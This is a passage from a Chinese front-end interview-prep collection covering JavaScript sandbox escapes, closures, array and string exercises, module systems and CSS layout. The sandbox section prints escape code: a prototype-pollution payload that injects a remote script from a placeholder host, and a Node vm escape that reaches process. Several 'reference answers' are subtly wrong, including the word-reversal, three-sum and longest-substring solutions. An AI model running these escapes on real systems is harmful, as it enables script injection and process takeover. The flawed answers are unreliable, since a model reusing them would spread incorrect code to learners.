createSandbox(\"value='haha';console.log(a)\",testObj) 看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.proto就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。 createSandbox(` a.b.__proto__.toString = ()=>&#123; new (()=>&#123;&#125;).constructor(\"var script = document.createElement('script'); script.src = 'http://xss.js'; script.type = 'text/javascript'; document.body.appendChild(script);\")() &#125; `,testObj) console.log(testObj.a.b.__proto__.toString()) 例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。 你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过proto查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过： (&#123;&#125;).__proto__.toString= ()=>&#123;console.log(111)&#125;; 可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。 借助iframe实现沙箱 前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱 &lt;iframe sandbox src=\"...\">&lt;/iframe> 但是这也会带来一些限制： script脚本不能执行 不能发送ajax请求 不能使用本地存储，即localStorage,cookie等 不能创建新的弹窗和window 不能发送表单 不能加载额外插件比如flash等 不过别方，你可以对这个iframe标签进行一些配置： 接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。 1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。 2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。 3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制 简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。 nodejs中的沙箱 nodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。 const vm = require('vm'); const x = 1; const sandbox = &#123; x: 2 &#125;; vm.createContext(sandbox); // Contextify the sandbox. const code = 'x += 40; var y = 17;'; vm.runInContext(code, sandbox); console.log(sandbox.x); // 42 console.log(sandbox.y); // 17 console.log(x); // 1; y is not defined. vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。 但是vm是绝对安全的吗？不一定。 const vm = require('vm'); vm.runInNewContext(\"this.constructor.constructor('return process')().exit()\") 通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。 let ctx = Object.create(null); ctx.a = 1; // ctx上不能包含引用类型的属性 vm.runInNewContext(\"this.constructor.constructor('return process')().exit()\", ctx); 让我们来看一下TSW中是怎么使用的： const vm = require('vm'); const SbFunction = vm.runInNewContext('(Function)', Object.create(null)); // 沙堆 ... if (opt.jsonpCallback) &#123; code = `var result=null; var $&#123;opt.jsonpCallback&#125;=function($1)&#123;result=$1&#125;; $&#123;responseText&#125;; return result;`; obj = new SbFunction(code)(); &#125; ... 通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。 53、闭包的理解参考答案： 闭包： 一个函数和对其周围状态（lexical environment，词法环境）的引用捆绑在一起（或者说函数被引用包围）， 这样的组合就是闭包（closure）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。 闭包的特点： 让外部访问函数内部变量成为可能；​ 可以避免使用全局变量，防止全局变量污染；​ 可以让局部变量常驻在内存中；​ 会造成内存泄漏（有一块内存空间被长期占用，而不被释放） 应用场景 埋点（是网站分析的一种常用的数据采集方法）计数器 function count() &#123; var num = 0; return function () &#123; return ++num &#125; &#125; var getNum = count(); var getNewNum = count(); document.querySelectorAll('button')[0].onclick = function()&#123; console.log('点击加入购物车次数： '+getNum()); &#125; document.querySelectorAll('button')[1].onclick = function()&#123; console.log('点击付款次数： '+getNewNum()); &#125; 事件+循环 按照以下方式添加事件，打印出来的i不是按照序号的 形成原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境 var lis = document.querySelectorAll('li'); for (var i = 0; i &lt; lis.length; i++) &#123; lis[i].onclick = function () &#123; alert(i) &#125; &#125; 解决办法： 使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境 var lis = document.querySelectorAll('li'); for (var i = 0; i &lt; lis.length; i++) &#123; (function (j) &#123; lis[j].onclick = function () &#123; alert(j) &#125; &#125;)(i) &#125; JS应用篇字符串中的单词逆序输出（手写）let str = \"Hello My name is kif and i am from XTU\"; function reChange1(str) &#123; return str.split(\"\").reverse().join(\"\"); &#125; console.log(reChange1(str)); let str = \"Hello My name is kif and i am from XTU\"; function reChange2(str) &#123; let newSTr = \"\"; for (let i = str.length - 1; i >= 0; i--) &#123; newSTr += str.charAt(i); &#125; return newSTr console.log(reChange2(str)); function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组参考答案： 把考点拆成了4个小项；需要用递归算法实现：a) 生成一个长度为n的空数组arr。b) 生成一个（min－max）之间的随机整数rand。c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for&#x2F;while等循环]d) 最终输出一个长度为n，且内容不重复的数组arr。 Math.random//产生一个[0，1)之间的随机数。 Math.random()： //返回指定范围的随机数(m-n之间)的公式: Math.random()*(n-m)+m； 或者 Math.random()*(n+1-m)+m function buildArray(arr, n, min, max) &#123; var num = Math.floor(Math.random() * (max - min + 1)) + min; if (!arr.includes(num)) &#123; arr.push(num); &#125; return arr.length === n ? arr : buildArray(arr, n, min, max); &#125; var result = buildArray([], 5, 2, 32); console.table(result); function rand(min, max, N) &#123; let arr = []; let l = 0; console.log(N); for (; l &lt; N; ) &#123; // console.log(l); let r = Math.floor(Math.random() * (max - min)) + min; if (!arr.includes(r)) &#123; console.log(r); arr.push(r); l++; &#125; &#125; return arr; &#125; console.log(rand(2, 61, 5)); 实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路参考答案： 1.遍历数组法 它是最简单的数组去重方法（indexOf方法） 实现思路：新建一个数组，遍历去要重的数组，当值不在新数组的时候（indexOf为-1）就加入该新数组中； var arr=[2,8,5,0,5,2,6,7,2]; function unique1(arr)&#123; var hash=[]; for (var i = 0; i &lt; arr.length; i++) &#123; if(hash.indexOf(arr[i])==-1)&#123; hash.push(arr[i]); &#125; &#125; return hash; &#125; 2.数组下标判断法 调用indexOf方法，性能和方法1差不多 实现思路：如果当前数组的第 i 项在当前数组中第一次出现的位置不是 i，那么表示第 i 项是重复的，忽略掉。否则存入结果数组。 function unique2(arr)&#123; var hash=[]; for (var i = 0; i &lt; arr.length; i++) &#123; if(arr.indexOf(arr[i])==i)&#123; hash.push(arr[i]); &#125; &#125; return hash; &#125; 3.排序后相邻去除法 实现思路：给传入的数组排序，排序后相同的值会相邻，然后遍历排序后数组时，新数组只加入不与前一值重复的值。 function unique3(arr)&#123; arr.sort(); var hash=[arr[0]]; for (var i = 1; i &lt; arr.length; i++) &#123; if(arr[i]!=hash[hash.length-1])&#123; hash.push(arr[i]); &#125; &#125; return hash; &#125; 4.优化遍历数组法（推荐） 实现思路：双层循环，外循环表示从0到arr.length，内循环表示从i+1到arr.length 将没重复的右边值放入新数组。（检测到有重复值时终止当前循环同时进入外层循环的下一轮判断） function unique4(arr)&#123; var hash=[]; for (var i = 0; i &lt; arr.length; i++) &#123; for (var j = i+1; j &lt; arr.length; j++) &#123; if(arr[i]===arr[j])&#123; ++i; break; &#125; &#125; hash.push(arr[i]); &#125; return hash; &#125; 5.ES6实现 基本思路：ES6提供了新的数据结构Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。 Set函数可以接受一个数组（或类似数组的对象）作为参数，用来初始化。 function unique5(arr)&#123; var x = new Set(arr); return [...x]; &#125; 扩展：如果重复，则去掉该元素 数组下标去重 function unique22(arr)&#123; var hash=[]; for (var i = 0; i &lt; arr.length; i++) &#123; if(arr.indexOf(arr[i])==arr.lastIndexOf(arr[i]))&#123; hash.push(arr[i]); &#125; &#125; return hash; &#125; 传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]let a = [1, [[2], '3', 4], 5]; function change(arr) &#123; let x = arr.toString(); let list = x.split(\",\"); let ans = list.map((i) => &#123; // console.log(i) return typeof i === 'string' ? Number(i) : i; &#125;); // console.log(ans) return ans; &#125; console.log(change(a)); ​ ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中： var arr = [1, [2, [3, 4]]]; console.log([].concat(...arr)); // [1, 2, [3, 4]] 我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法： // 方法4 var arr = [1, [2, [3, 4]]]; function flatten(arr) &#123; while (arr.some(item => Array.isArray(item))) &#123; arr = [].concat(...arr); &#125; return arr; &#125; console.log(flatten(arr)) 用正则和非正则实现12345678.12&#x3D;》12，345，678.12let num = 12345678.12 //12,345,678.12 function change(number) &#123; let s = number.toString() //console.log(s) let L = s.split('.') let num_s L.length == 2 ? num_s = L[1] : num_s = -1 let N=L[0] let num_f let y =N.length % 3 num_f = N.slice(0, y) for (let i = y; i &lt; N.length; i += 3) &#123; num_f += ',' + N.slice(i,i+3) &#125; if (num_s != -1) &#123; num_f += '.' + num_s &#125; return num_f &#125; console.log(change(num))//12,345,678.12 写一个判断是否是空对象的函数参考答案： function isEmpty(value) &#123; return ( value === null || value === undefined || (typeof value === 'object' &amp;&amp; Object.keys(value).length === 0) ) &#125; 给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度function countWord(str) &#123; let arr = []; let count = 0; for (let i = 0; i &lt; str.length; i++) &#123; console.log(str.charAt(i)); if (!arr.includes(str.charAt(i))) &#123; arr.push(str[i]); count++; &#125; &#125; console.log(arr); return count; &#125; let str = \"qqdwqcasdffdghjsbjhbm\"; console.log(countWord(str)); 三数之和参考答案： 题目描述 给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c &#x3D; 0 ？找出所有满足条件且不重复的三元组。 注意：答案中不可以包含重复的三元组。 //例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]， //满足要求的三元组集合为： [ [-1, 0, 1], [-1, -1, 2] ] let nums = [-1, 0, 1, 2, -1, -4]; function getNum(nums) &#123; if (nums.length &lt; 3) &#123; return []; &#125; let ans = []; nums.sort((a, b) => a - b); console.log(nums); for (let i = 0; i &lt; nums.length; i++) &#123; if (nums[i] > 0) &#123; break; &#125; let l = i + 1; let r = nums.length - 1; while (l &lt; r) &#123; let sum = nums[i] + nums[l] + nums[r]; if (sum == 0) &#123; ans.push(nums[i], nums[l], nums[r]); l++; r++; &#125; else if (sum > 0) &#123; r--; &#125; else &#123; l++; &#125; &#125; &#125; return ans; &#125; console.log(getNum(nums)); 代码解释题 var company = &#123; address: 'beijing' &#125; var yideng = Object.create(company); delete yideng.address console.log(yideng.address); // 写出执行结果，并解释原因 答案beijing 解析这里的 yideng 通过 prototype 继承了 company的 address。yideng自己并没有address属性。所以delete操作符的作用是无效的。 扩展1.delete使用原则：delete 操作符用来删除一个对象的属性。2.delete在删除一个不可配置的属性时在严格模式和非严格模式下的区别:（1）在严格模式中，如果属性是一个不可配置（non-configurable）属性，删除时会抛出异常;（2）非严格模式下返回 false。3.delete能删除隐式声明的全局变量：这个全局变量其实是global对象(window)的属性4.delete能删除的：（1）可配置对象的属性（2）隐式声明的全局变量 （3）用户定义的属性 （4）在ECMAScript 6中，通过 const 或 let 声明指定的 “temporal dead zone” (TDZ) 对 delete 操作符也会起作用delete不能删除的：（2）显式声明的全局变量 （2）内置对象的内置属性 （3）一个对象从原型继承而来的属性5.delete删除数组元素：（1）当你删除一个数组元素时，数组的 length 属性并不会变小，数组元素变成undefined（2）当用 delete 操作符删除一个数组元素时，被删除的元素已经完全不属于该数组。（3）如果你想让一个数组元素的值变为 undefined 而不是删除它，可以使用 undefined 给其赋值而不是使用 delete 操作符。此时数组元素是在数组中的6.delete 操作符与直接释放内存（只能通过解除引用来间接释放）没有关系。 模块化CommonJS规范参考答案： CommonJS规范加载模块是同步的，只有加载完成，才能执行后面的操作。 CommonJS规范中的module、exports和require 每个文件就是一个模块，有自己的作用域。每个模块内部，module变量代表当前模块，是一个对象，它的exports属性（即module.exports）是对外的接口。 module.exports属性表示当前模块对外输出的接口，其他文件加载该模块，实际上就是读取module.exports变量。 为了方便，Node为每个模块提供一个exports变量，指向module.exports。 let exports = module.exports; require命令用于加载模块文件。 使用示例： //name.js exports.name = function()&#123;return '李婷婷'&#125;; //导出 //getName.js let getName = require('name'); //引入 注：不能直接将exports变量指向一个值，因为这样等于切断了exports与module.exports的联系：如下 exports = function(x)&#123;console.log(x)&#125; 如果一个模块的对外接口，就是一个单一的值，不能使用exports输出，只能使用module.exports输出。 CommonJS模块导入用require，导出用module.exports。导出的对象需注意，如果是静态值，而且非常量，后期可能会有所改动的，请使用函数动态获取，否则无法获取修改值。导入的参数，是可以随意改动的，所以使用时要注意 ES6 module 和 CommonJS module 的区别参考答案： 为CommonJS的require语法是同步的，所以就导致了CommonJS模块规范只适合用在服务端，而ES6模块无论是在浏览器端还是服务端都是可以使用的，但是在服务端中，还需要遵循一些特殊的规则才能使用 ； CommonJS 模块输出的是一个值的拷贝，而ES6 模块输出的是值的引用； CommonJS 模块是运行时加载，而ES6 模块是编译时输出接口，使得对JS的模块进行静态分析成为了可能 因为两个模块加载机制的不同，所以在对待循环加载的时候，它们会有不同的表现。CommonJS遇到循环依赖的时候，只会输出已经执行的部分，后续的输出或者变化，是不会影响已经输出的变量。而ES6模块相反，使用import加载一个变量，变量不会被缓存，真正取值的时候就能取到最终的值； 关于模块顶层的this指向问题，在CommonJS顶层，this指向当前模块；而在ES6模块中，this指向undefined； 关于两个模块互相引用的问题，在ES6模块当中，是支持加载CommonJS模块的。但是反过来，CommonJS并不能requireES6模块，在NodeJS中，两种模块方案是分开处理的。 ES6 module、CommonJS module 循环引用的问题参考答案： 循环加载指的是a脚本的执行依赖b脚本，b脚本的执行依赖a脚本 CommonJS模块是加载时执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出。 ES6模块对导出模块，变量，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用。 CommonJS模块规范主要适用于后端Node.js，后端Node.js是同步模块加载，所以在模块循环引入时模块已经执行完毕。推荐前端工程中使用ES6的模块规范，通过安装Babel转码插件支持ES6模块引入的语法。 解析： CommonJS模块的加载原理 CommonJS模块就是一个脚本文件，require命令第一次加载该脚本时就会执行整个脚本，然后在内存中生成该模块的一个说明对象。 &#123; id: '', //模块名，唯一 exports: &#123; //模块输出的各个接口 ... &#125;, loaded: true, //模块的脚本是否执行完毕 ... &#125; 以后用到这个模块时，就会到对象的exports属性中取值。即使再次执行require命令，也不会再次执行该模块，而是到缓存中取值。 CommonJS模块是加载时执行，即脚本代码在require时就全部执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出。 案例说明： 案例来源于Node官方说明：nodejs.org&#x2F;api&#x2F;modules… //a.js exports.done = false; var b = require('./b.js'); console.log('在a.js中，b.done = %j', b.done); exports.done = true; console.log('a.js执行完毕！') //b.js exports.done = false; var a = require('./a.js'); console.log('在b.js中，a.done = %j', a.done); exports.done = true; console.log('b.js执行完毕！') //main.js var a = require('./a.js'); var b = require('./b.js'); console.log('在main.js中，a.done = %j, b.done = %j', a.done, b.done); 输出结果如下： &#x2F;&#x2F;node环境下运行main.js node main.js 在b.js中，a.done &#x3D; false b.js执行完毕！ 在a.js中，b.done &#x3D; true a.js执行完毕！ 在main.js中，a.done &#x3D; true, b.done &#x3D; true JS代码执行顺序如下： 1）main.js中先加载a.js，a脚本先输出done变量，值为false，然后加载b脚本，a的代码停止执行，等待b脚本执行完成后，才会继续往下执行。 2）b.js执行到第二行会去加载a.js，这时发生循环加载，系统会去a.js模块对应对象的exports属性取值，因为a.js没执行完，从exports属性只能取回已经执行的部分，未执行的部分不返回，所以取回的值并不是最后的值。 3）a.js已执行的代码只有一行，exports.done &#x3D; false;所以对于b.js来说，require a.js只输出了一个变量done，值为false。往下执行console.log(‘在b.js中，a.done &#x3D; %j’, a.done);控制台打印出： 在b.js中，a.done &#x3D; false 4）b.js继续往下执行，done变量设置为true，console.log(‘b.js执行完毕！’)，等到全部执行完毕，将执行权交还给a.js。此时控制台输出： b.js执行完毕！ 5）执行权交给a.js后，a.js接着往下执行，执行console.log(‘在a.js中，b.done &#x3D; %j’, b.done);控制台打印出： 在a.js中，b.done &#x3D; true 6）a.js继续执行，变量done设置为true，直到a.js执行完毕。 a.js执行完毕！ 7）main.js中第二行不会再次执行b.js，直接输出缓存结果。最后控制台输出： 在main.js中，a.done &#x3D; true, b.done &#x3D; true 总结： 1）在b.js中，a.js没有执行完毕，只执行了第一行，所以循环加载中，只输出已执行的部分。 2）main.js第二行不会再次执行，而是输出缓存b.js的执行结果。exports.done &#x3D; true; ES6模块的循环加载 ES6模块与CommonJS有本质区别，ES6模块对导出变量，方法，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用，需要开发者保证真正取值时能够取到值，只要引用是存在的，代码就能执行。 案例说明： //even.js import &#123;odd&#125; from './odd'; var counter = 0; export function even(n)&#123; counter ++; console.log(counter); return n == 0 || odd(n-1); &#125; 复制代码 //odd.js import &#123;even&#125; from './even.js'; export function odd(n)&#123; return n != 0 &amp;&amp; even(n-1); &#125; 复制代码 //index.js import * as m from './even.js'; var x = m.even(5); console.log(x); var y = m.even(4); console.log(y); 执行index.js，输出结果如下： babel-node index.js 1 2 3 false 4 5 6 true 可以看出counter的值是累加的，ES6是动态引用。如果上面的引用改为CommonJS代码，会报错，因为在odd.js里，even.js代码并没有执行。改成CommonJS规范加载的代码为： //even.js var odd = require('./odd.js'); var counter = 0; module.exports = function even(n)&#123; counter ++; console.log(counter); return n == 0 || odd(n-1); &#125; //odd.js var even = require('./even.js'); module.exports = function odd(n)&#123; return n != 0 &amp;&amp; even(n-1); &#125; //index.js var even = require('./even.js'); var x = even(5); console.log(x); var y = even(5); console.log(y); 执行index.js，输出结果如下： $ babel-node index.js 1 &#x2F;Users&#x2F;name&#x2F;Projects&#x2F;node&#x2F;ES6&#x2F;odd.1.js:6 return n !&#x3D; 0 &amp;&amp; even(n - 1); ^ TypeError: even is not a function at odd (&#x2F;Users&#x2F;name&#x2F;Projects&#x2F;node&#x2F;ES6&#x2F;odd.1.js:4:22) Css:1、未知高度元素垂直居中、垂直居中的实现方式有哪些？参考答案： 1、绝对定位+css3 transform:translate(-50%，-50%) .wrap&#123; position:relative; &#125; .child&#123; position: absolute; top:50%; left:50%; -webkit-transform:translate(-50%,-50%); &#125; 2、css3 的flex布局 .wrap&#123; display:flex; justify-content:center; &#125; .child&#123; align-self:center; &#125; 3、table布局 &lt;div class=\"wrap\"> &lt;div class=\"child\"> &lt;div>sadgsdgasgd&lt;/div> &lt;/div> &lt;/div> .wrap&#123; display:table; text-align:center; &#125; .child&#123; background:#ccc; display:table-cell; vertical-align:middle; &#125; .child div&#123; width:300px; height:150px; background:red; margin:0 auto; &#125; 2、padding , margin 百分比单位依据参考答案： 在CSS 盒模型中，依据CSS2.2文档，margin与padding的百分比指定值时，一律参考包含盒的宽度。示例： .father&#123; height: 100px; width: 200px; border: solid; &#125; .son&#123; margin: 20%; padding: 20%; width: 50%; height: 50%; &#125; 如下图，包括padding-top&#x2F;bottom,margin-top&#x2F;bottom在内，所有padding和margin均是参考的包含块的宽度，故它们的值为200px * 20% &#x3D; 40px。 3、移动端 1px 问题参考答案： 问题：1px 的边框，在高清屏下，移动端的1px 会很粗 产生原因 那么为什么会产生这个问题呢？主要是跟一个东西有关，DPR(devicePixelRatio) 设备像素比，它是默认缩放为100%的情况下，设备像素和CSS像素的比值。 window.devicePixelRatio&#x3D;物理像素 &#x2F;CSS像素 复制代码 目前主流的屏幕DPR&#x3D;2 （iPhone 8）,或者3 （iPhone 8 Plus）。拿2倍屏来说，设备的物理像素要实现1像素，而DPR&#x3D;2，所以css 像素只能是 0.5。一般设计稿是按照750来设计的，它上面的1px是以750来参照的，而我们写css样式是以设备375为参照的，所以我们应该写的0.5px就好了啊！ 试过了就知道，iOS 8+系统支持，安卓系统不支持。 解决方案 WWDC对iOS统给出的方案 在 WWDC大会上，给出来了1px方案，当写 0.5px的时候，就会显示一个物理像素宽度的 border，而不是一个css像素的 border。 所以在iOS下，你可以这样写。 border:0.5px solid #E5E5E5 可能你会问为什么在3倍屏下，不是0.3333px 这样的？经过测试，在Chrome上模拟iPhone 8Plus，发现小于0.46px的时候是显示不出来。 总结： 优点：简单，没有副作用 缺点：支持iOS 8+，不支持安卓。后期安卓follow就好了。 使用边框图片 border: 1px solid transparent; border-image: url('./../../image/96.jpg') 2 repeat; 总结： 优点：没有副作用 缺点：border颜色变了就得重新制作图片；圆角会比较模糊。 使用box-shadow实现 box-shadow: 0 -1px 1px -1px #e5e5e5, //上边线 1px 0 1px -1px #e5e5e5, //右边线 0 1px 1px -1px #e5e5e5, //下边线 -1px 0 1px -1px #e5e5e5; //左边线 总结 优点：使用简单，圆角也可以实现 缺点：模拟的实现方法，仔细看谁看不出来这是阴影不是边框。 使用伪元素 1条border .setOnePx&#123; position: relative; &amp;::after&#123; position: absolute; content: ''; background-color: #e5e5e5; display: block; width: 100%; height: 1px; /*no*/ transform: scale(1, 0.5); top: 0; left: 0; &#125; &#125; 可以看到，将伪元素设置绝对定位，并且和父元素的左上角对齐，将width 设置100%，height设置为1px，然后进行在Y方向缩小0.5倍。 4 条border .setBorderAll&#123; position: relative; &amp;:after&#123; content:\" \"; position:absolute; top: 0; left: 0; width: 200%; height: 200%; transform: scale(0.5); transform-origin: left top; box-sizing: border-box; border: 1px solid #E5E5E5; border-radius: 4px; &#125; &#125; 同样为伪元素设置绝对定位，并且和父元素左上角对其。将伪元素的长和宽先放大2倍，然后再设置一个边框，以左上角为中心，缩放到原来的0.5倍 总结： 优点：全机型兼容，实现了真正的1px，而且可以圆角。 缺点：暂用了after 伪元素，可能影响清除浮动。 设置viewport的scale值 这个解决方案是利用viewport+rem+js 实现的。 &lt;html> &lt;head> &lt;title>1px question&lt;/title> &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\"> &lt;meta name=\"viewport\" id=\"WebViewport\" content=\"initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no\"> &lt;style> html &#123; font-size: 1px; &#125; * &#123; padding: 0; margin: 0; &#125; .top_b &#123; border-bottom: 1px solid #E5E5E5; &#125; .a,.b &#123; box-sizing: border-box; margin-top: 1rem; padding: 1rem; font-size: 1.4rem; &#125; .a &#123; width: 100%; &#125; .b &#123; background: #f5f5f5; width: 100%; &#125; &lt;/style> &lt;script> var viewport = document.querySelector(\"meta[name=viewport]\"); //下面是根据设备像素设置viewport if (window.devicePixelRatio == 1) &#123; viewport.setAttribute('content', 'width=device-width,initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no'); &#125; if (window.devicePixelRatio == 2) &#123; viewport.setAttribute('content', 'width=device-width,initial-scale=0.5, maximum-scale=0.5, minimum-scale=0.5, user-scalable=no'); &#125; if (window.devicePixelRatio == 3) &#123; viewport.setAttribute('content', 'width=device-width,initial-scale=0.3333333333333333, maximum-scale=0.3333333333333333, minimum-scale=0.3333333333333333, user-scalable=no'); &#125; var docEl = document.documentElement; var fontsize = 32* (docEl.clientWidth / 750) + 'px'; docEl.style.fontSize = fontsize; &lt;/script> &lt;/head> &lt;body> &lt;div class=\"top_b a\">下面的底边宽度是虚拟1像素的&lt;/div> &lt;div class=\"b\">上面的边框宽度是虚拟1像素的&lt;/div> &lt;/body> &lt;/html> 总结 优点：全机型兼容，直接写1px不能再方便 缺点：适用于新的项目，老项目可能改动大 4、BFC参考答案： 简介 在解释BFC之前，先说一下文档流。我们常说的文档流其实分为定位流、浮动流、普通流三种。而普通流其实就是指BFC中的FC。FC(Formatting Context)，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用。常见的FC有BFC、IFC，还有GFC和FFC。 BFC(Block Formatting Context)块级格式化上下文，是用于布局块级盒子的一块渲染区域。MDN上的解释：BFC是Web页面 CSS 视觉渲染的一部分，用于决定块盒子的布局及浮动相互影响范围的一个区域。 注意：一个BFC的范围包含创建该上下文元素的所有子元素，但不包括创建了新BFC的子元素的内部元素。这从另一方角度说明，一个元素不能同时存在于两个BFC中。因为如果一个元素能够同时处于两个BFC中，那么就意味着这个元素能与两个BFC中的元素发生作用，就违反了BFC的隔离作用。 三种文档流的定位方案 常规流(Normal flow) 在常规流中，盒一个接着一个排列; 在块级格式化上下文里面， 它们竖着排列； 在行内格式化上下文里面， 它们横着排列; 当position为static或relative，并且float为none时会触发常规流； 对于静态定位(static positioning)，position: static，盒的位置是常规流布局里的位置； 对于相对定位(relative positioning)，position: relative，盒偏移位置由top、bottom、left、right属性定义。即使有偏移，仍然保留原有的位置，其它常规流不能占用这个位置。 浮动(Floats) 左浮动元素尽量靠左、靠上，右浮动同理 这导致常规流环绕在它的周边，除非设置 clear 属性 浮动元素不会影响块级元素的布局 但浮动元素会影响行内元素的布局，让其围绕在自己周围，撑大父级元素，从而间接影响块级元素布局 最高点不会超过当前行的最高点、它前面的浮动元素的最高点 不超过它的包含块，除非元素本身已经比包含块更宽 行内元素出现在左浮动元素的右边和右浮动元素的左边，左浮动元素的左边和右浮动元素的右边是不会摆放浮动元素的 绝对定位(Absolute positioning) 绝对定位方案，盒从常规流中被移除，不影响常规流的布局； 它的定位相对于它的包含块，相关CSS属性：top、bottom、left、right； 如果元素的属性position为absolute或fixed，它是绝对定位元素； 对于position: absolute，元素定位将相对于上级元素中最近的一个relative、fixed、absolute，如果没有则相对于body； BFC触发方式 3.1 根元素，即HTML标签 3.2 浮动元素：float值为left、right 3.3 overflow值不为 visible，为 auto、scroll、hidden 3.4 display值为 inline-block、table-cell、table-caption、table、inline-table、flex、inline-flex、grid、inline-grid 3.5 定位元素：position值为 absolute、fixed 注意：display:table也可以生成BFC的原因在于Table会默认生成一个匿名的table-cell，是这个匿名的table-cell生成了BFC。 约束规则 浏览器对BFC区域的约束规则： 生成BFC元素的子元素会一个接一个的放置。 垂直方向上他们的起点是一个包含块的顶部，两个相邻子元素之间的垂直距离取决于元素的margin特性。在BFC中相邻的块级元素的外边距会折叠(Mastering margin collapsing) 生成BFC元素的子元素中，每一个子元素左外边距与包含块的左边界相接触（对于从右到左的格式化，右外边距接触右边界），即使浮动元素也是如此（尽管子元素的内容区域会由于浮动而压缩），除非这个子元素也创建了一个新的BFC（如它自身也是一个浮动元素）。 规则解读： 内部的Box会在垂直方向上一个接一个的放置 内部的Box垂直方向上的距离由margin决定。（完整的说法是：属于同一个BFC的两个相邻Box的margin会发生折叠，不同BFC不会发生折叠。） 每个元素的左外边距与包含块的左边界相接触（从左向右），即使浮动元素也是如此。（这说明BFC中子元素不会超出他的包含块，而position为absolute的元素可以超出他的包含块边界） BFC的区域不会与float的元素区域重叠 计算BFC的高度时，浮动子元素也参与计算 作用 BFC是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素，反之亦然。我们可以利用BFC的这个特性来做很多事。 5.1 阻止元素被浮动元素覆盖 一个正常文档流的block元素可能被一个float元素覆盖，挤占正常文档流，因此可以设置一个元素的float、 display、position值等方式触发BFC，以阻止被浮动盒子覆盖。 5.2 可以包含浮动元素 通过改变包含浮动子元素的父盒子的属性值，触发BFC，以此来包含子元素的浮动盒子。 5.3 阻止因为浏览器因为四舍五入造成的多列布局换行的情况 有时候因为多列布局采用小数点位的width导致因为浏览器因为四舍五入造成的换行的情况，可以在最后一 列触发BFC的形式来阻止换行的发生。比如下面栗子的特殊情况 5.4 阻止相邻元素的margin合并 属于同一个BFC的两个相邻块级子元素的上下margin会发生重叠，(设置writing-mode:tb-rl时，水平 